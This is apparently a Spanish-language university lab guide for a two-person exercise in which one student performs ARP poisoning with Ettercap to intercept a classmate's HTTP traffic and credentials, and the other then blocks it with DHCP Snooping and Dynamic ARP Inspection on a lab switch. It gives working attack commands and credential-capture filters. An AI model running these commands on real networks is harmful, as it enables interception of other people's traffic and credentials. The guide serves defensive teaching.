# Práctica 2: MITM con ARP Poisoning

## Información General

| Campo | Valor |
|-------|-------|
| **Duración** | 2 horas |
| **Dificultad** | Media |
| **Ataque principal** | ARP Poisoning / ARP Spoofing |
| **Defensa principal** | DHCP Snooping + Dynamic ARP Inspection (DAI) |
| **Herramientas** | Ettercap, Wireshark, arp-scan |

## Objetivo

Demostrar cómo un atacante puede interceptar el tráfico entre dos equipos mediante ARP Poisoning (ataque Man-in-the-Middle) y cómo mitigarlo con Dynamic ARP Inspection.

---

## Roles del Equipo

| Rol | Responsabilidad | Equipo |
|-----|-----------------|--------|
| **🔴 ATACANTE** | Ejecutar ARP Poisoning con Ettercap, capturar tráfico | PC Atacante |
| **🔵 DEFENSOR** | Configurar switch, verificar logs, documentar | PC Defensor + Switch |

> **Nota:** Ambos deben documentar sus acciones. El defensor también actúa como "víctima" en la primera fase.

---

## Topología de Red

```
                    ┌─────────────────┐
                    │  Router/Gateway │
                    │   192.168.1.1   │
                    └────────┬────────┘
                             │ GE1
                    ┌────────┴────────┐
                    │  Switch SG300   │
                    │  192.168.1.237  │
                    └┬───────┬───────┬┘
                     │GE2    │GE3    │GE4
                     │       │       │
              ┌──────┴──┐ ┌──┴──────┐ ┌──────────┐
              │🔴ATACANTE│ │🔵DEFENSOR│ │ Otros... │
              │192.168.1.X│ │192.168.1.Y│ │          │
              └──────────┘ └──────────┘ └──────────┘
```

---

## FASE 1: Reconocimiento (15 minutos)

### 🔴 ATACANTE: Identificar objetivos

#### Paso 1.1: Verificar tu configuración de red

```bash
# macOS
ifconfig en0 | grep inet
# Resultado esperado: inet 192.168.1.X netmask...

# Linux
ip addr show eth0
```

**Anota tu IP:** `_______________`

#### Paso 1.2: Descubrir equipos en la red

```bash
# Escaneo ARP (el más silencioso)
sudo arp-scan -l -I en0      # macOS
sudo arp-scan -l -I eth0     # Linux

# Alternativa con nmap
nmap -sn 192.168.1.0/24
```

**Identifica y anota:**
- Gateway: `192.168.1.1` (Target 1)
- Víctima (Defensor): `192.168.1.___` (Target 2)
- Switch: `192.168.1.237`

#### Paso 1.3: Verificar tabla ARP actual

```bash
# Ver tabla ARP local
arp -a
```

**Anota la MAC del gateway:** `___:___:___:___:___:___`

---

### 🔵 DEFENSOR: Verificar estado inicial del switch

#### Paso 1.4: Acceder al switch

1. Abre navegador: `https://192.168.1.237`
2. Inicia sesión

#### Paso 1.5: Verificar que las defensas están DESHABILITADAS

**DHCP Snooping:**
1. Navega a: **IP Configuration → DHCP Snooping/Relay → Properties**
2. Estado: `[ ] Deshabilitado`

**ARP Inspection:**
1. Navega a: **Security → ARP Inspection → Properties**
2. Estado: `[ ] Deshabilitado`

**Captura de pantalla:** Ambas funciones deshabilitadas

#### Paso 1.6: Anotar tu configuración

```bash
# Tu IP
ifconfig en0 | grep inet

# Tu MAC
ifconfig en0 | grep ether
```

**Tu IP:** `192.168.1.___`
**Tu MAC:** `___:___:___:___:___:___`

---

## FASE 2: Ataque SIN Defensa (25 minutos)

### 🔴 ATACANTE: Preparar el ataque

#### Paso 2.1: Habilitar IP forwarding

**CRÍTICO:** Sin esto, el tráfico no se reenvía y la víctima pierde conectividad.

```bash
# macOS
sudo sysctl -w net.inet.ip.forwarding=1

# Linux
sudo sysctl -w net.ipv4.ip_forward=1
# O también:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

#### Paso 2.2: Iniciar captura de tráfico

En una terminal separada:

```bash
# Capturar tráfico de la víctima
sudo tcpdump -i en0 -n host 192.168.1.Y -w captura_mitm.pcap

# O abrir Wireshark
wireshark -k -i en0 -f "host 192.168.1.Y"
```

Filtro útil en Wireshark para ver credenciales:
```
http.request.method == "POST" || ftp || telnet
```

#### Paso 2.3: Ejecutar ARP Poisoning con Ettercap

```bash
# Sintaxis: ettercap -T -M arp:remote /GATEWAY// /VICTIMA//
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.Y//
```

**Parámetros:**
- `-T`: Modo texto
- `-M arp:remote`: Ataque MITM usando ARP poisoning
- `/192.168.1.1//`: Target 1 (Gateway)
- `/192.168.1.Y//`: Target 2 (Víctima/Defensor)

**Salida esperada:**
```
ARP poisoning victims:
 GROUP 1 : 192.168.1.1 AA:BB:CC:DD:EE:FF
 GROUP 2 : 192.168.1.Y 11:22:33:44:55:66

Starting Unified sniffing...
```

---

### 🔵 DEFENSOR: Verificar que eres víctima

#### Paso 2.4: Comprobar tabla ARP envenenada

```bash
# Ver tabla ARP
arp -a
```

**Antes del ataque:**
```
gateway (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether]
```

**Durante el ataque (ENVENENADA):**
```
gateway (192.168.1.1) at XX:XX:XX:XX:XX:XX [ether]  ← MAC del ATACANTE!
```

**Captura de pantalla:** Tabla ARP mostrando la MAC incorrecta del gateway

#### Paso 2.5: Generar tráfico para captura

Genera tráfico HTTP (sin HTTPS) para que el atacante lo capture:

```bash
# Visitar una página HTTP (no HTTPS)
curl http://httpbin.org/post -d "usuario=admin&password=secreto123"

# O simplemente navega a sitios HTTP
```

---

### 🔴 ATACANTE: Verificar captura

#### Paso 2.6: Observar tráfico interceptado

En Ettercap verás el tráfico pasar:
```
HTTP : 192.168.1.Y -> httpbin.org [POST]
```

En Wireshark/tcpdump verás los paquetes de la víctima.

**Captura de pantalla:** Tráfico HTTP interceptado mostrando datos

#### Paso 2.7: Detener el ataque

En Ettercap presiona `q` para salir limpiamente (restaura las tablas ARP).

---

### 🔵 DEFENSOR: Verificar restauración

#### Paso 2.8: Comprobar que la tabla ARP se restauró

```bash
arp -a
# La MAC del gateway debe volver a ser la correcta
```

---

## FASE 3: Implementar Defensa (35 minutos)

### 🔵 DEFENSOR: Configurar el switch

> **Importante:** ARP Inspection (DAI) requiere DHCP Snooping habilitado primero.

#### Paso 3.1: Habilitar DHCP Snooping

1. Navega a: **IP Configuration → DHCP Snooping/Relay → Properties**
2. Marca **DHCP Snooping Status: Enable**
3. Click **Apply**

#### Paso 3.2: Configurar puerto Trusted para el router

1. Navega a: **IP Configuration → DHCP Snooping/Relay → Interface Settings**
2. Selecciona el puerto del router (GE1)
3. Marca como **Trusted**
4. Click **Apply**

#### Paso 3.3: Generar entradas en DHCP Binding Database

Para que DAI funcione, necesita la binding database poblada:

```bash
# Desde el PC del Defensor, renovar IP
sudo ipconfig set en0 DHCP    # macOS
sudo dhclient eth0            # Linux
```

**Verifica la binding database:**
1. Navega a: **IP Configuration → DHCP Snooping/Relay → DHCP Snooping Binding Database**
2. Debe aparecer tu IP y MAC

**Captura de pantalla:** Binding database con entradas

#### Paso 3.4: Habilitar Dynamic ARP Inspection (DAI)

1. Navega a: **Security → ARP Inspection → Properties**
2. Marca **ARP Inspection Status: Enable**
3. Click **Apply**

#### Paso 3.5: Configurar ARP Inspection por interfaz

1. Navega a: **Security → ARP Inspection → Interface Settings**
2. Para el puerto del router (GE1): **Trusted** ✅
3. Para los demás puertos: **Untrusted** (por defecto)
4. Click **Apply**

**Configuración final:**

| Puerto | DHCP Snooping | ARP Inspection |
|--------|---------------|----------------|
| GE1 (Router) | Trusted | Trusted |
| GE2 (Atacante) | Untrusted | Untrusted |
| GE3 (Defensor) | Untrusted | Untrusted |

#### Paso 3.6: Configurar validación ARP (opcional pero recomendado)

1. En **ARP Inspection → Properties**
2. Habilita validación de:
   - [x] Source MAC
   - [x] Destination MAC
   - [x] IP Address
3. Click **Apply**

#### Paso 3.7: Guardar configuración

1. Navega a: **Administration → File Management → Copy/Save Configuration**
2. Copia **Running Config** → **Startup Config**
3. Click **Apply**

**Captura de pantalla:** Configuración DAI completa

---

## FASE 4: Verificar Defensa (25 minutos)

### 🔴 ATACANTE: Re-ejecutar el ataque

#### Paso 4.1: Intentar ARP Poisoning nuevamente

```bash
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.Y//
```

**Observación esperada:**
- Ettercap parece funcionar normalmente
- PERO los paquetes ARP maliciosos son descartados por el switch
- El ataque NO tiene efecto

---

### 🔵 DEFENSOR: Verificar que la defensa funciona

#### Paso 4.2: Comprobar tabla ARP

```bash
arp -a
# La MAC del gateway debe ser la CORRECTA (no la del atacante)
```

#### Paso 4.3: Verificar conectividad normal

```bash
# Ping al gateway
ping -c 4 192.168.1.1

# Debe funcionar perfectamente
```

#### Paso 4.4: Revisar logs del switch

1. Navega a: **Status and Statistics → View Log → RAM Memory**
2. Busca entradas de ARP Inspection

**Logs esperados:**
```
ARP Inspection: Packet dropped - invalid binding
ARP Inspection: Source MAC mismatch on port GE2
```

**Captura de pantalla:** Logs mostrando paquetes ARP descartados

#### Paso 4.5: Ver estadísticas de ARP Inspection

1. Navega a: **Security → ARP Inspection → Statistics**
2. Verás contadores de:
   - Paquetes recibidos
   - Paquetes descartados
   - Razón del descarte

**Captura de pantalla:** Estadísticas mostrando paquetes bloqueados

---

### 🔴 ATACANTE: Verificar fallo del ataque

#### Paso 4.6: Observar que no hay tráfico interceptado

```bash
# Iniciar captura
sudo tcpdump -i en0 -n host 192.168.1.Y
```

**Resultado:** No se captura tráfico de la víctima (excepto broadcast).

---

## FASE 5: Documentación (20 minutos)

### Ambos: Completar plantillas

#### Plantilla de Ataque (🔴 ATACANTE completa)

```markdown
## Ataque: ARP Poisoning (MITM)

### Información
- **Fecha:** [HOY]
- **Herramienta:** Ettercap
- **Comando:** `sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.Y//`
- **Objetivo:** Interceptar tráfico entre víctima y gateway

### Resultado SIN defensa
- [x] Ataque exitoso
- Tabla ARP de víctima envenenada
- Tráfico HTTP interceptado

### Resultado CON defensa
- [x] Ataque bloqueado
- DAI descarta paquetes ARP maliciosos
- Logs del switch registran el intento
```

#### Plantilla de Defensa (🔵 DEFENSOR completa)

```markdown
## Defensa: Dynamic ARP Inspection (DAI)

### Requisitos previos
- DHCP Snooping habilitado
- Binding database poblada

### Configuración
- **ARP Inspection:** Habilitado globalmente
- **Puerto Trusted:** GE1 (Router)
- **Validación:** Source MAC, Dest MAC, IP

### Rutas en el switch
- DHCP Snooping: IP Configuration → DHCP Snooping/Relay
- ARP Inspection: Security → ARP Inspection

### Efectividad
- Ataque probado: ARP Poisoning
- Resultado: BLOQUEADO
- Paquetes descartados: [número de las estadísticas]
```

#### Tabla Comparativa (Ambos)

| Aspecto | Sin DAI | Con DAI |
|---------|---------|---------|
| Tabla ARP víctima | Envenenada | Correcta |
| Tráfico interceptado | Sí | No |
| Conectividad víctima | Funciona* | Funciona |
| Logs de seguridad | Ninguno | Alertas |
| Detección del ataque | No | Sí |

*Con IP forwarding habilitado en atacante

---

## Entregables

### 🔴 ATACANTE
- [ ] Captura: Tabla ARP envenenada de la víctima
- [ ] Captura: Tráfico interceptado en Wireshark
- [ ] Captura: Ettercap ejecutándose
- [ ] Plantilla de ataque completada

### 🔵 DEFENSOR
- [ ] Captura: DHCP Snooping configurado
- [ ] Captura: DHCP Binding Database
- [ ] Captura: ARP Inspection configurado
- [ ] Captura: Logs de paquetes bloqueados
- [ ] Captura: Estadísticas de DAI
- [ ] Plantilla de defensa completada

### Ambos
- [ ] Tabla comparativa antes/después
- [ ] Mapeo a funciones NIST

---

## Mapeo NIST Framework

| Función | Rol | Acción |
|---------|-----|--------|
| **IDENTIFICAR** | Ambos | Reconocimiento de red, identificar equipos |
| **PROTEGER** | 🔵 | Configurar DHCP Snooping + DAI |
| **DETECTAR** | 🔵 | Revisar logs y estadísticas |
| **RESPONDER** | Switch | Bloqueo automático de ARP maliciosos |
| **RECUPERAR** | 🔵 | Configuración guardada |

---

## Troubleshooting

### La víctima pierde conectividad durante el ataque
- El atacante no habilitó IP forwarding
- Solución: `sudo sysctl -w net.inet.ip.forwarding=1`

### DAI bloquea tráfico legítimo
- La binding database no tiene la entrada del equipo
- Solución: Renovar IP con DHCP para crear la entrada

### No hay entradas en la binding database
- DHCP Snooping no estaba habilitado cuando se asignó la IP
- Solución:
  1. Liberar IP: `sudo dhclient -r eth0`
  2. Obtener nueva: `sudo dhclient eth0`

### El atacante no puede ver tráfico HTTPS
- HTTPS está cifrado, ARP Poisoning no rompe el cifrado
- Solo se puede ver tráfico HTTP plano

---

## Comandos de Referencia

```bash
# === RECONOCIMIENTO ===
sudo arp-scan -l -I en0
arp -a

# === ATAQUE ===
# Habilitar forwarding
sudo sysctl -w net.inet.ip.forwarding=1

# ARP Poisoning
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.Y//

# === CAPTURA ===
wireshark -k -i en0 -f "host 192.168.1.Y"
sudo tcpdump -i en0 -n host 192.168.1.Y

# === VERIFICACIÓN ===
arp -a
ping -c 4 192.168.1.1
```

---

## Navegación

⬅️ [Práctica 1: DHCP Starvation](practica_01_dhcp_starvation.md) | [Práctica 3: Ciclo NIST →](practica_03_ciclo_nist.md)
